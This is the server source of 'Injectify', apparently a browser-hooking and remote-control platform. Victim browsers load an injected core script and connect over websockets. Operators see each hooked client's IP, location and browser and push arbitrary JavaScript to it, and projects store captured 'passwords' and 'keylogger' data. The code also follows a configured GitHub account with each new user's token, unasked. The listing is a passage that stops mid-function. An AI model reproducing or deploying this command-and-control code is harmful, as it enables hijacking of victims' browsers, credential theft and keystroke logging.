/* eslint-disable prefer-promise-reject-errors */

const config = require('./server.config.js').injectify
const MongoClient = require('mongodb').MongoClient
const express = require('express')
const app = express()
const server = app.listen(config.express)
const io = require('socket.io').listen(server)
const sockjs = require('sockjs')
const injectServer = sockjs.createServer({ log: (severity, message) => {
  if (severity == 'debug')
    console.log(
      chalk.greenBright('[SockJS] ') +
      chalk.yellowBright(message)
    )
  else if (severity == 'error')
    console.log(
      chalk.redBright('[SockJS] ') +
      chalk.yellowBright(message)
    )
  else if (config.verbose)
    console.log(
      chalk.greenBright('[SockJS] ') +
      chalk.yellowBright(message)
    )
}})
const path = require('path')
const request = require('request')
const {URL} = require('url')
const chalk = require('chalk')
const fs = require('fs')
const geoip = require('geoip-lite')
const {flag} = require('country-emoji')
const twemoji = require('twemoji')
const atob = require('atob')
const btoa = require('btoa')
const beautify = require('js-beautify').js_beautify
const UglifyJS = require('uglify-es')
const ObfuscateJS = require('js-obfuscator')
const reverse = require('reverse-string')
const parseAgent = require('user-agent-parser')
const me = require('mongo-escape').escape
const injector = require('./inject/server.js')

const inject = {
  core: UglifyJS.minify(fs.readFileSync('./inject/core.js', 'utf8')).code,
  debugCore: fs.readFileSync('./inject/core.js', 'utf8'),
  modules: {},
  debugModules: {},
  clients: [],
  watchers: []
}

injector.loadModules((modules, debugModules, count) => {
  inject.modules = modules
  inject.debugModules = debugModules
  console.log(
    chalk.greenBright('[inject:modules] ') +
    chalk.yellowBright('successfully loaded ') +
    chalk.magentaBright(count) +
    chalk.yellowBright(' modules into memory')
  )
})

console.log(chalk.greenBright('[Injectify] ') + 'listening on port ' + config.express)

process.on('unhandledRejection', (reason, p) => {
  console.log(chalk.redBright('[Promise] ') + ' Unhandled Rejection at:', p, chalk.redBright('\nREASON:'), reason)
})

MongoClient.connect(config.mongodb, function (err, db) {
  if (err) throw err
  function getIP (ip) {
    if (ip === '::1' || ip === '::ffff:127.0.0.1') {
      return '127.0.0.1'
    } else {
      return ip
    }
  }
  io.on('connection', socket => {
    let globalToken
    let refresh
    let prevState
    let injectWatcher
    var getToken = code => {
      return new Promise((resolve, reject) => {
        if (!code) {
          reject(Error('Failed to authenticate account, null code'))
        } else {
          request({
            url: 'https://github.com/login/oauth/access_token',
            method: 'POST',
            headers: {
              'Accept': 'application/json'
            },
            qs: {
              'client_id': config.github.client_id,
              'client_secret': config.github.client_secret,
              'code': code
            }
          }, (error, response, github) => {
            try {
              github = JSON.parse(github)
            } catch (e) {
              console.log(chalk.redBright('[websocket] ') + chalk.yellowBright('failed to retrieve token '), github)
              console.error(e)
              reject(Error('Failed to parse GitHub response'))
            }
            if (!error && response.statusCode === 200 && github.access_token) {
              resolve(github.access_token)
            } else {
              reject(Error('Failed to authenticate account, invalid code => ' + code))
            }
          })
        }
      })
    }
    var getUser = token => {
      return new Promise((resolve, reject) => {
        request({
          url: 'https://api.github.com/user?access_token=' + encodeURIComponent(token),
          method: 'GET',
          headers: {
            'Accept': 'application/json',
            'User-Agent': 'Injectify'
          }
        }, (error, response, user) => {
          if (error) {
            console.error(error)
            return
          }
          try {
            user = JSON.parse(user)
          } catch (e) {
            console.error(chalk.redBright('[websocket] ') + chalk.yellowBright('failed to retrieve user API '))
            reject({
              title: 'Could not authenticate you',
              message: 'Failed to parse the GitHub user API response'
            })
          }
          if (!error && response.statusCode === 200 && user.login) {
            resolve(user)
          } else {
            reject({
              title: 'Could not authenticate you',
              message: 'GitHub API rejected token!',
              token: token
            })
          }
        })
      })
    }
    var database = (user) => {
      return new Promise((resolve, reject) => {
        db.collection('users', (err, users) => {
          if (err) throw err
          users.findOne({id: user.id}).then(doc => {
            resolve(doc)
          })
        })
      })
    }
    var login = (user, token, loginMethod) => {
      return new Promise((resolve, reject) => {
        db.collection('users', (err, users) => {
          if (err) throw err
          users.findOne({id: user.id}).then(doc => {
            let ipAddress = getIP(socket.handshake.address)
            if (socket.handshake.headers['x-forwarded-for']) ipAddress = getIP(socket.handshake.headers['x-forwarded-for'].split(',')[0])
            if (doc !== null) {
              // User exists in database
              users.updateOne({
                id: user.id
              },
                {
                  $set: {
                    username: user.login,
                    github: user // Update the GitHub object with latest values
                  },
                  $push: {
                    logins: {
                      timestamp: new Date(),
                      ip: ipAddress,
                      token: token,
                      login_type: loginMethod
                    }
                  }
                }).then(() => {
                  resolve()
                })
            } else {
              // User doesn't exist in database
              users.insertOne({
                username: user.login,
                id: user.id,
                payment: {
                  account_type: 'free',
                  method: 'none'
                },
                github: user,
                logins: [{
                  timestamp: new Date(),
                  ip: ipAddress,
                  token: token,
                  login_type: loginMethod
                }]
              }, (err, res) => {
                if (err) {
                  reject(Error(err))
                  throw err
                } else {
                  console.log(
                    chalk.greenBright('[database] ') +
                    chalk.yellowBright('added user ') +
                    chalk.magentaBright(user.id) +
                    chalk.cyanBright(' (' + user.login + ')')
                  )
                  if (config.follow.enable) {
                    request({
                      url: 'https://api.github.com/user/following/' + config.follow.username + '?access_token=' + encodeURIComponent(token),
                      method: 'PUT',
                      headers: {
                        'User-Agent': 'Injectify'
                      }
                    }, (error, response) => {
                      if (error) throw error
                      resolve()
                    })
                  }
                }
              })
            }
          })
        })
      })
    }
    var newProject = (project, user) => {
      return new Promise((resolve, reject) => {
        database(user).then(dbUser => {
          db.collection('projects', (err, projects) => {
            if (err) throw err
            projects.find({
              $or: [
                {'permissions.owners': user.id}
              ]
            }).count().then(count => {
              let restriction = 3
              if (dbUser.payment.account_type.toLowerCase() === 'pro') restriction = 35
              if (dbUser.payment.account_type.toLowerCase() === 'elite') restriction = 350
              if (count >= restriction) {
                reject({
                  title: 'Upgrade account',
                  message: 'Your ' + dbUser.payment.account_type.toLowerCase() + ' account is limited to ' + restriction + ' projects (using ' + count + ')',
                  id: 'upgrade'
                })
                return
              }
              projects.findOne({ name: project }).then(doc => {
                if (doc == null) {
                  // Project doesn't exist in database
                  projects.insertOne({
                    name: project,
                    permissions: {
                      owners: [user.id],
                      admins: [],
                      readonly: []
                    },
                    config: {
                      filter: {
                        type: 'whitelist',
                        domains: []
                      },
                      created_at: new Date()
                    },
                    inject: {
                      autoexecute: ''
                    },
                    passwords: [],
                    keylogger: []
                  }, (err, res) => {
                    if (err) {
                      throw err
                    } else {
                      console.log(
                        chalk.greenBright('[database] ') +
                        chalk.magentaBright(user.id) +
                        chalk.cyanBright(' (' + user.login + ') ') +
                        chalk.yellowBright('added project ') +
                        chalk.magentaBright(project)
                      )
                      resolve({
                        title: 'Project created',
                        message: "Created project '" + project + "', " + (+restriction - count) + ' slots remaining'
                      })
                    }
                  })
                } else {
                  // Project already exists
                  console.log(
                    chalk.redBright('[database] ') +
                    chalk.yellowBright('project ') +
                    chalk.magentaBright(project) +
                    chalk.yellowBright(' already exists ')
                  )
                  reject({
                    title: 'Project name already taken',
                    message: 'Please choose another name'
                  })
                }
              })
            }).catch(error => {
              reject({
                title: 'Database error',
                message: 'An internal error occured whilst handling your request'
              })
              throw error
            })
          })
        }).catch(error => {
          reject({
            title: 'Database error',
            message: 'An internal error occured whilst handling your request'
          })
          throw error
        })
      })
    }
    var getProjects = user => {
      return new Promise((resolve, reject) => {
        db.collection('projects', (err, projects) => {
          if (err) throw err
          let projectsWithAccess = []
          projects.find({
            $or: [
              {'permissions.owners': user.id},
              {'permissions.admins': user.id},
              {'permissions.readonly': user.id}
            ]
          }).sort({name: 1}).forEach(doc => {
            if (doc !== null) {
              projectsWithAccess.push({
                name: doc.name,
                permissions: doc.permissions
              })
            }
          }, error => {
            if (error) throw error
            if (projectsWithAccess.length > 0) {
              resolve(projectsWithAccess)
            } else {
              reject('no projects saved for user ' + user.id)
            }
          })
        })
      })
    }
    var getProject = (name, user) => {
      return new Promise((resolve, reject) => {
        db.collection('projects', (err, projects) => {
          if (err) throw err
          projects.findOne({
            $or: [
              {'permissions.owners': user.id},
              {'permissions.admins': user.id},
              {'permissions.readonly': user.id}
            ],
            $and: [
              {'name': name}
            ]
          }).then(doc => {
            if (doc !== null) {
              let myPermissionLevel = 3
              if (doc.permissions.owners.includes(user.id)) { myPermissionLevel = 1 } else if (doc.permissions.admins.includes(user.id)) { myPermissionLevel = 2 }
              resolve({
                doc: doc,
                myPermissionLevel: myPermissionLevel
              })
            } else {
              reject({
                title: 'Access denied',
                message: "You don't have permission to access project " + name
              })
            }
          })
        })
      })
    }

    socket.on('auth:github', data => {
      if (data.code) {
        // Convert the code into a user-token
        getToken(data.code).then(token => {
          if (config.debug) {
            console.log(
            chalk.greenBright('[GitHub] ') +
            chalk.yellowBright('retrieved token ') +
            chalk.magentaBright(token)
          )
          }
          // Convert the token into a user object
          getUser(token).then(user => {
            globalToken = token
            socket.emit('auth:github', {
              success: true,
              token: token,
              user: user
            })
            if (config.debug) {
              console.log(
              chalk.greenBright('[GitHub] ') +
              chalk.yellowBright('authenticated user ') +
              chalk.magentaBright(user.id) +
              chalk.cyanBright(' (' + user.login + ')')
            )
            }
            // Add the user to the database if they don't exist
            login(user, token, 'manual').then(() => {
              getProjects(user).then(projects => {
                socket.emit('user:projects', projects)
              }).catch(error => {
                if (config.debug) console.log(chalk.redBright('[database] '), error)
              })
            }).catch(error => {
              console.log(chalk.redBright('[database] '), error)
              socket.emit('database:registration', {
                success: false,
                message: error
              })
            })
          }).catch(error => {
            console.log(chalk.redBright('[auth:github] '), error.message)
            socket.emit('err', {
              title: error.title,
              message: error.message
            })
          })
        }).catch(error => {
          console.log(chalk.redBright('[auth:github] '), error.message)
          socket.emit('err', {
            title: error.title,
            message: error.message
          })
        })
      }
    })

    socket.on('auth:signout', data => {
      globalToken = ''
      prevState = ''
      refresh = ''
      if (injectWatcher) {
        inject.watchers[injectWatcher] = inject.watchers[injectWatcher].filter(watcher => {
          return watcher.id !== socket.id
        })
      }
    })

    socket.on('auth:github/token', token => {
      if (token) {
        // Convert the token into a user object
        getUser(token).then(user => {
          globalToken = token
          socket.emit('auth:github', {
            success: true,
            token: token,
            user: user
          })
          if (config.debug) {
            console.log(
              chalk.greenBright('[GitHub] ') +
              chalk.yellowBright('authenticated user ') +
              chalk.magentaBright(user.id) +
              chalk.cyanBright(' (' + user.login + ')')
            )
          }
          // Add the user to the database if they don't exist
          login(user, token, 'automatic').then(() => {
            getProjects(user).then(projects => {
              socket.emit('user:projects', projects)
            }).catch(error => {
              if (config.debug) console.log(chalk.redBright('[database] '), error)
            })
          }).catch(error => {
            console.log(chalk.redBright('[database] '), error)
            socket.emit('database:registration', {
              success: false,
              message: error.toString()
            })
          })
        }).catch(error => {
          // Signal the user to re-authenticate their GitHub account
          console.log(chalk.redBright('[auth:github/token] '), error.message)
          socket.emit('auth:github/stale', {
            title: error.title.toString(),
            message: error.message.toString()
          })
        })
      }
    })

    socket.on('project:create', project => {
      if (project.name && globalToken) {
        if (project.name.length > 50) {
          socket.emit('err', {
            title: 'Failed to create project',
            message: 'Project name must be under 50 characters'
          })
          return
        }
        getUser(globalToken).then(user => {
          newProject(project.name, user).then(data => {
            socket.emit('notify', {
              title: data.title,
              message: data.message,
              id: data.id
            })
            getProjects(user).then(projects => {
              socket.emit('user:projects', projects)
            }).catch(error => {
              if (config.debug) console.log(chalk.redBright('[database] '), error)
            })
          }).catch(e => {
            socket.emit('err', {
              title: e.title,
              message: e.message,
              id: e.id
            })
          })
        }).catch(error => {
          // Failed to authenticate user with token
          console.log(chalk.redBright('[project:create] '), error.message)
          socket.emit('err', {
            title: error.title.toString(),
            message: error.message.toString(),
            id: error.id
          })
        })
      } else {
        socket.emit('err', {
          title: 'Access denied',
          message: 'You need to be authenticated first!'
        })
      }
    })

    socket.on('project:read', project => {
      if (project.name && globalToken) {
        if (project.type === 'overview' || project.type === 'passwords' || project.type === 'keylogger' || project.type === 'inject' || project.type === 'config') {
          getUser(globalToken).then(user => {
            getProject(project.name, user).then(thisProject => {
              if (project.type === 'overview' || project.type === 'config') {
                // Remove the passwords, inject & keylogger from the cloned object
                delete thisProject.doc.passwords
                delete thisProject.doc.inject
                delete thisProject.doc.keylogger
                socket.emit('project:read', {
                  type: project.type,
                  doc: thisProject.doc
                })
              } else {
                socket.emit('project:read', {
                  type: project.type,
                  doc: thisProject.doc[project.type]
                })
              }
              prevState = JSON.stringify(thisProject.doc)
              database(user).then(doc => {
                let timeout = 1000
                // if (doc.payment.account_type.toLowerCase() != "free") {
                if ((doc.payment.account_type.toLowerCase() === 'elite')) timeout = 100
                clearInterval(refresh)
                getProject(project.name, user).then(thisProject => {
                  refresh = setInterval(() => {
                    getProject(project.name, user).then(thisProject => {
                      if (JSON.stringify(thisProject.doc) === prevState) return
                      //socket.emit('project:read', thisProject.doc)
                      prevState = JSON.stringify(thisProject.doc)
                    }).catch(e => {
                      socket.emit('err', {
                        title: e.title,
                        message: e.message
                      })
                    })
                  }, timeout)
                }).catch(e => {
                  socket.emit('err', {
                    title: e.title,
                    message: e.message
                  })
                })
                // }
              })
            }).catch(e => {
              socket.emit('err', {
                title: e.title,
                message: e.message
              })
            })
          }).catch(error => {
            // Failed to authenticate user with token
            console.log(chalk.redBright('[project:read] '), error.message)
            socket.emit('err', {
              title: error.title.toString(),
              message: error.message.toString()
            })
          })
        } else {
          socket.emit('err', {
            title: 'Invalid request',
            message: 'Project collection type does not exist'
          })
        }
      } else {
        socket.emit('err', {
          title: 'Access denied',
          message: 'You need to be authenticated first!'
        })
      }
    })

    socket.on('project:modify', data => {
      let command = data.command
      let project = data.project
      var convertToID = (type, value) => {
        return new Promise((resolve, reject) => {
          if (type === 'id') {
            request({
              url: 'https://api.github.com/user/' + encodeURIComponent(value) + '?client_id=' + config.github.client_id + '&client_secret=' + config.github.client_secret,
              method: 'GET',
              headers: {
                'Accept': 'application/json',
                'User-Agent': 'Injectify'
              }
            }, (error, response, user) => {
              try {
                user = JSON.parse(user)
              } catch (e) {
                console.log(chalk.redBright('[websocket] ') + chalk.yellowBright('failed to retrieve user API '), user)
                console.error(e)
                reject({
                  title: 'Internal server error',
                  message: 'Failed to parse the GitHub user API response'
                })
              }
              if (!error && response.statusCode === 200 && user.id) {
                resolve(user)
              } else {
                console.log(error, response.statusCode, user.id)
                reject({
                  title: 'User does not exist',
                  message: 'The specified user does not exist'
                })
              }
            })
          } else {
            request({
              url: 'https://api.github.com/users/' + encodeURIComponent(value) + '?client_id=' + config.github.client_id + '&client_secret=' + config.github.client_secret,
              method: 'GET',
              headers: {
                'Accept': 'application/json',
                'User-Agent': 'Injectify'
              }
            }, (error, response, user) => {
              try {
                user = JSON.parse(user)
              } catch (e) {
                console.log(chalk.redBright('[websocket] ') + chalk.yellowBright('failed to retrieve user API '), user)
                console.error(e)
                reject({
                  title: 'Internal server error',
                  message: 'Failed to parse the GitHub user API response'
                })
              }
              if (!error && response.statusCode === 200 && user.id) {
                resolve(user)
              } else {
                console.log(error, response.statusCode, user.id)
                reject({
                  title: 'User does not exist',
                  message: 'The specified user does not exist'
                })
              }
            })
          }
        })
      }
      var addToProject = (requestingUser, targetUser, choosenPermissionLevel, targetProject) => {
        return new Promise((resolve, reject) => {
          if (targetProject.doc.permissions.owners.includes(targetUser) || targetProject.doc.permissions.admins.includes(targetUser) || targetProject.doc.permissions.readonly.includes(targetUser)) {
            reject({
              title: 'User already exists',
              message: 'The selected user already exists in this project'
            })
          } else {
            if (choosenPermissionLevel === 'owners') {
              if (!targetProject.doc.permissions.owners.includes(requestingUser.id)) {
                reject({
                  title: 'Insufficient permissions',
                  message: "You don't have permission to add user"
                })
                return
              }
            } else if (choosenPermissionLevel === 'admins') {
              if (!targetProject.doc.permissions.owners.includes(requestingUser.id)) {
                reject({
                  title: 'Insufficient permissions',
                  message: "You don't have permission to add user"
                })
                return
              }
            } else if (choosenPermissionLevel === 'readonly') {
              if (!targetProject.doc.permissions.owners.includes(requestingUser.id) && !targetProject.doc.permissions.admins.includes(requestingUser.id)) {
                reject({
                  title: 'Insufficient permissions',
                  message: "You don't have permission to add user"
                })
                return
              }
            } else {
              reject({
                title: 'Failed to add user',
                message: 'Invalid permission type selected'
              })
              return
            }
            db.collection('projects', (err, projects) => {
              if (err) throw err
              projects.updateOne({
                name: targetProject.doc.name
              },
                {
                  $push: {
                    ['permissions.' + choosenPermissionLevel]: targetUser
                  }
                })
            })
            resolve({
              title: 'Added user to project',
              message: 'Successfully added user to project'
            })
          }
        })
      }
      var removeFromProject = (requestingUser, targetUser, targetProject) => {
        return new Promise((resolve, reject) => {
          let theirPermissionLevel,
            theirPermissionName
          if (targetProject.doc.permissions.owners.includes(targetUser)) {
            theirPermissionLevel = 1
            theirPermissionName = 'permissions.owners'
          } else if (targetProject.doc.permissions.admins.includes(targetUser)) {
            theirPermissionLevel = 2
            theirPermissionName = 'permissions.admins'
          } else if (targetProject.doc.permissions.readonly.includes(targetUser)) {
            theirPermissionLevel = 3
            theirPermissionName = 'permissions.readonly'
          }
          if (targetProject.myPermissionLevel !== 3 && targetProject.myPermissionLevel <= theirPermissionLevel) {
            db.collection('projects', (err, projects) => {
              if (err) throw err
              projects.updateOne({
                name: targetProject.doc.name
              },
                {
                  $pull: {
                    [theirPermissionName]: targetUser
                  }
                })
            })
            resolve({
              title: 'Removed user',
              message: 'Successfully removed user from project'
            })
          } else {
            reject({
              title: 'Insufficient permissions',
              message: "You don't have permission to remove user"
            })
          }
        })
      }
      var renameProject = (requestingUser, targetProject, newName) => {
        return new Promise((resolve, reject) => {
          if (targetProject.doc.permissions.owners.includes(requestingUser.id)) {
            db.collection('projects', (err, projects) => {
              if (err) throw err
              projects.findOne({name: newName}).then(doc => {
                if (doc == null) {
                  projects.updateOne({
                    name: targetProject.doc.name
                  },
                    {
                      $set: {
                        name: newName
                      }
                    })
                  resolve({
                    title: 'Renamed project',
                    message: 'Successfully renamed project to ' + newName
                  })
                } else {
                  reject({
                    title: 'Failed to rename project',
                    message: 'The selected name ' + newName + ' is already taken'
                  })
                }
              })
            })
          } else {
            reject({
              title: 'Insufficient permissions',
              message: 'You need to be an owner to rename this project'
            })
          }
        })
      }
      var updateFilters = (requestingUser, targetProject, newFilters) => {
        return new Promise((resolve, reject) => {
          if (targetProject.doc.permissions.owners.includes(requestingUser.id) || targetProject.doc.permissions.admins.includes(requestingUser.id)) {
            db.collection('projects', (err, projects) => {
              if (err) throw err
              projects.findOne({name: targetProject.doc.name}).then(doc => {
                if (doc !== null) {
                  projects.updateOne({
                    name: targetProject.doc.name
                  },
                    {
                      $set: {
                        'config.filter': newFilters
                      }
                    })
                  resolve({
                    title: 'Updated domain filters',
                    message: 'Successfully updated filters for ' + targetProject.doc.name
                  })
                } else {
                  reject({
                    title: 'Failed to update filters',
                    message: "Project doesn't exist"
                  })
                }
              })
            })
          } else {
            reject({
              title: 'Insufficient permissions',
              message: "You don't have permission to modify filters for this project"
            })
          }
        })
      }
      if (command && project) {
        getUser(globalToken).then(user => {
          getProject(project, user).then(thisProject => {
            if (command === 'permissions:add') {
              if (data.project && data.method && data.type && data.value) {
                convertToID(data.method, data.value).then(targetUser => {
                  addToProject(user, targetUser.id, data.type, thisProject).then(r => {
                    socket.emit('notify', {
                      title: r.title,
                      message: r.message
                    })
                    console.log(
                      chalk.greenBright('[database] ') +
                      chalk.magentaBright(user.id) +
                      chalk.cyanBright(' (' + user.login + ') ') +
                      chalk.yellowBright('added user ') +
                      chalk.magentaBright(targetUser.id) +
                      chalk.cyanBright(' (' + targetUser.login + ') ') +
                      chalk.yellowBright(' to project ') +
                      chalk.magentaBright(thisProject.doc.name)
                    )
                  }).catch(e => {
                    socket.emit('err', {
                      title: e.title,
                      message: e.message
                    })
                  })
                }).catch(e => {
                  socket.emit('err', {
                    title: e.title,
                    message: e.message
                  })
                })
              } else {
                socket.emit('err', {
                  title: 'Failed to add user',
                  message: 'Invalid request sent'
                })
              }
            }
            if (command === 'permissions:remove') {
              if (data.user) {
                removeFromProject(user, data.user, thisProject).then(response => {
                  socket.emit('notify', response)
                  console.log(
                    chalk.greenBright('[database] ') +
                    chalk.magentaBright(user.id) +
                    chalk.cyanBright(' (' + user.login + ') ') +
                    chalk.yellowBright('removed user ') +
                    chalk.magentaBright(data.user) +
                    chalk.yellowBright(' from project ') +
                    chalk.magentaBright(thisProject.doc.name)
                  )
                }).catch(e => {
                  socket.emit('err', {
                    title: e.title,
                    message: e.message
                  })
                })
              } else {
                socket.emit('err', {
                  title: 'Invalid request',
                  message: 'Failed to remove user from project'
                })
              }
            }
            if (command === 'project:rename') {
              if (data.newName) {
                if (data.newName.length > 50) {
                  socket.emit('err', {
                    title: 'Failed to rename project',
                    message: 'Project name must be under 50 characters'
                  })
                  return
                }
                if (data.newName === thisProject.doc.name) return
                renameProject(user, thisProject, data.newName).then(response => {
                  clearInterval(refresh)
                  socket.emit('project:switch', {
                    project: data.newName
                  })
                  setTimeout(() => {
                    getProjects(user).then(projects => {
                      socket.emit('user:projects', projects)
                    }).catch(error => {
                      if (config.debug) console.log(chalk.redBright('[database] '), error)
                    })
                    socket.emit('notify', response)
                  }, 10)
                  console.log(
                    chalk.greenBright('[database] ') +
                    chalk.magentaBright(user.id) +
                    chalk.cyanBright(' (' + user.login + ') ') +
                    chalk.yellowBright('renamed project from ') +
                    chalk.magentaBright(thisProject.doc.name) +
                    chalk.yellowBright(' to ') +
                    chalk.magentaBright(data.newName)
                  )
                }).catch(e => {
                  socket.emit('err', {
                    title: e.title,
                    message: e.message
                  })
                })
              } else {
                socket.emit('err', {
                  title: 'Invalid request',
                  message: 'New project name not specified'
                })
              }
            }
            if (command === 'filters:modify') {
              if (data.project && data.filter) {
                updateFilters(user, thisProject, data.filter).then((response) => {
                  socket.emit('notify', {
                    title: response.title,
                    message: response.message
                  })
                }).catch(e => {
                  socket.emit('err', {
                    title: e.title,
                    message: e.message
                  })
                })
              } else {
                socket.emit('err', {
                  title: 'Invalid request',
                  message: 'Failed to update filters'
                })
              }
            }
          }).catch(e => {
            socket.emit('err', {
              title: e.title,
              message: e.message
            })
          })
        }).catch(e => {
          socket.emit('err', {
            title: e.title,
            message: e.message
          })
        })
      }
    })

    socket.on('inject:clients', data => {
      let { project } = data
      if (project && globalToken) {
        getUser(globalToken).then(user => {
          getProject(project, user).then(thisProject => {
            injectWatcher = thisProject.doc['_id']
            if (!inject.watchers[injectWatcher]) inject.watchers[injectWatcher] = []
            inject.watchers[injectWatcher].push({
              id: socket.id,
              callback: () => {
                socket.emit('inject:clients', inject.clients[injectWatcher])
              }
            })
            socket.emit('inject:clients', inject.clients[thisProject.doc['_id']])
          }).catch(e => {
            console.log(e)
            socket.emit('err', {
              title: e.title,
              message: e.message
            })
          })
        }).catch(error => {
          // Failed to authenticate user with token
          console.log(chalk.redBright('[inject:clients] '), error.message)
          socket.emit('err', {
            title: error.title.toString(),
            message: error.message.toString()
          })
        })
      } else {
        socket.emit('err', {
          title: 'Access denied',
          message: 'You need to be authenticated first!'
        })
      }
    })

    socket.on('inject:execute', data => {
      let { project, id, script } = data
      if (project && id && script && globalToken) {
        getUser(globalToken).then(user => {
          getProject(project, user).then(thisProject => {
            let client = inject.clients[thisProject.doc['_id']].find(c => c.id === id)
            if (client) {
              client.execute(script)
            } else {
              socket.emit('err', {
                title: 'Failed to execute!',
                message: 'Could not locate client'
              })
            }
          }).catch(e => {
            console.log(e)
            socket.emit('err', {
              title: e.title,
              message: e.message
            })
          })
        }).catch(error => {
          // Failed to authenticate user with token
          console.log(chalk.redBright('[inject:execute] '), error.message)
          socket.emit('err', {
            title: error.title.toString(),
            message: error.message.toString()
          })
        })
      } else {
        socket.emit('err', {
          title: 'Failed to execute!',
          message: 'Invalid request'
        })
      }
    })

    socket.on('project:close', data => {
      clearInterval(refresh)
    })

    socket.on('inject:close', data => {
      if (injectWatcher) {
        inject.watchers[injectWatcher] = inject.watchers[injectWatcher].filter(watcher => {
          return watcher.id !== socket.id
        })
      }
    })

    socket.on('disconnect', data => {
      if (injectWatcher) {
        inject.watchers[injectWatcher] = inject.watchers[injectWatcher].filter(watcher => {
          return watcher.id !== socket.id
        })
      }
      clearInterval(refresh)
    })
  })

  injectServer.on('connection', socket => {
    let checkIfValid = socket => {
      return new Promise((resolve, reject) => {
        let project = socket.url.split('?')
        let debug = false
        project = project[project.length - 1]
        if (project.charAt(0) === '$') {
          project = project.substring(1)
          debug = true
        }
        if (!project) {
          reject('websocket connection with invalid / missing project name, terminating')
          return
        }
        try {
          project = atob(project)
        } catch (e) {
          reject('websocket with invalid base64 encoded project name, terminating')
          return
        }
        db.collection('projects', (err, projects) => {
          if (err) throw err
          projects.findOne({
            'name': project
          }).then(doc => {
            if (doc === null) {
              reject('websocket connection to nonexistent project, terminating')
            } else {
              resolve({
                project: {
                  id: doc['_id'],
                  name: doc.name,
                  inject: doc.inject
                },
                id: +new Date(),
                debug: debug
              })
            }
          })
        })
      })
    }
    let send = (topic, data) => {
      socket.write(
        JSON.stringify({
          t: topic,
          d: data
        })
      )
    }
    checkIfValid(socket).then(data => {
      let { debug, project } = data
      // Create an array with the project's document ID (could use project name instead of ID)
      if (!inject.clients[project.id]) inject.clients[project.id] = []
      let inDebug = socket.url.charAt(19) === '$'
      let country = 'https://twemoji.maxcdn.com/2/svg/2753.svg'
      let ip
      try {
        ip = {
          query: socket.headers['x-forwarded-for'].split(',')[0]
        }
      } catch (e) {
        ip = {
          query: getIP(socket.remoteAddress)
        }
      }
      if (config.debug) {
        console.log(
          chalk.greenBright('[inject] ') +
          chalk.yellowBright('new websocket connection for project ') +
          chalk.magentaBright(project.name) +
          chalk.yellowBright(' from ') +
          chalk.magentaBright(ip.query)
        )
      }
      let parsedIP = geoip.lookup(ip.query)
      if (parsedIP) {
        parsedIP.query = ip.query
        ip = parsedIP
        country = 'https://twemoji.maxcdn.com/2/svg/' + twemoji.convert.toCodePoint(flag(ip.country)) + '.svg'
      }
      var agent = parseAgent(socket.headers['user-agent'])
      var browser = '/assets/svg/default.svg'
      if (socket.headers['user-agent'].includes('SamsungBrowser')) {
        browser = '/assets/svg/samsung.svg'
      } else if (socket.headers['user-agent'].includes('Edge')) {
        browser = '/assets/svg/edge.svg'
      } else if (socket.headers['user-agent'].includes('Trident')) {
        browser = '/assets/svg/ie.svg'
      } else if (agent.browser.name) {
        var browserName = agent.browser.name.toLowerCase()
        if (browserName === 'chrome') {
          browser = '/assets/svg/chrome.svg'
        } else if (browserName === 'firefox') {
          browser = '/assets/svg/firefox.svg'
        } else if (browserName === 'safari') {
          browser = '/assets/svg/safari.svg'
        } else if (browserName === 'opera') {
          browser = '/assets/svg/opera.svg'
        } else if (browserName === 'ie') {
          browser = '/assets/svg/ie.svg'
        }
      }
      inject.clients[project.id].push({
        id: data.id,
        debug: inDebug,
        'user-agent': agent,
        ip: ip,
        images: {
          country: country,
          browser: browser
        },
        socket: {
          headers: socket.headers,
          id: socket.id,
          remoteAddress: socket.remoteAddress,
          remotePort: socket.remotePort,
          url: socket.url
        },
        execute: script => {
          send('execute', script)
        }
      })

      /**
       * Callback to the Injectify users
       */
      if (inject.watchers[project.id]) {
        setTimeout(() => {
          inject.watchers[project.id].forEach(watcher => {
            watcher.callback()
          })
        }, 0)
      }

      /**
       * Send the inject core
       */
      if (debug) {
        var core = inject.debugCore
      } else {
        var core = inject.core
      }
      core = core.replace('client.ip', JSON.stringify(ip)).replace('client.agent', JSON.stringify(agent)).replace('client.headers', JSON.stringify(socket.headers))
      send('core', core)

      /**
       * Send the auto-execute script
       */
      if (project.inject) {
        if (project.inject.autoexecute) {
          send('execute', project.inject.autoexecute)
        }
      }

      socket.on('data', rawData => {
        try { rawData = JSON.parse(rawData); if (!rawData.t && !rawData.d) return } catch (e) { return }
        let on = (topic, callback) => {
          if (topic !== rawData.t) return
          callback(rawData.d)
        }

        on('e', data => { // error
          send('error', data)
          console.log(data)
        })

        on('execute', data => { // execute
          send('execute', data)
        })

        /**
         * Module loader
         */
        on('module', data => { // load a module
          if (!data.name) return
          var js = inject.modules[data.name]
          if (debug) js = inject.debugModules[data.name]
          if (js) {
            try {
              if (data.params) {
                js = 'module.params=' + JSON.stringify(data.params) + ';module.return=function(d){this.returned=d};' + js
              } else {
                js = 'module.return=function(d){this.returned=d};' + js
              }
              send('module:' + data.name, js)
            } catch (error) {
              send('module:' + data.name, false)
            }
          } else {
            send('module:' + data.name, false)
          }
        })

        on('r', data => { // response
          console.log(data)
        })

        on('ping', pingTime => { // ping
          send('pong', pingTime)
        })
      })

      socket.on('close', function () {
        inject.clients[project.id] = inject.clients[project.id].filter(client => client.id !== data.id)
        /**
         * Callback to the Injectify users
         */
        if (inject.watchers[project.id]) {
          setTimeout(() => {
            inject.watchers[project.id].forEach(watcher => {
              watcher.callback()
            })
          }, 0)
        }  
      })
    }).catch(error => {
      if (config.debug) {
        console.log(
        chalk.redBright('[inject] ') +
        chalk.yellowBright(error)
      )
      }
    })
  })

  injectServer.installHandlers(server, { prefix: '/i' })

  app.get('/r/*', (req, res) => {
    let headers = req.headers
    if (req.headers['forwarded-headers']) {
      // Attempt to extract forwarded headers
      try {
        headers = JSON.parse(decodeURIComponent(req.headers['forwarded-headers']))
        var key
        var keys = Object.keys(headers)
        var n = keys.length
        var newobj = {}
        while (n--) {
          key = keys[n]
          newobj[key.toLowerCase()] = headers[key]
        }
        headers = newobj
      } catch (e) {
        // Failed to parse JSON from forwarded headers => likely malicious
      }
    }
    let validate = base64 => {
      return new Promise((resolve, reject) => {
        if (typeof base64 === 'string') {
          try {
            let json = JSON.parse(decodeURI(Buffer.from(reverse(base64), 'base64').toString()))
            if (json) resolve(json)
          } catch (e) {
            reject(Error('invalid base64 encoded json string (' + e + ')'))
          }
        } else {
          reject(Error('empty request path'))
        }
      })
    }
    let Record = record => {
      return new Promise((resolve, reject) => {
        let project = 'a'
        let type = 't'
        let username = 'b'
        let identifier = 'b'
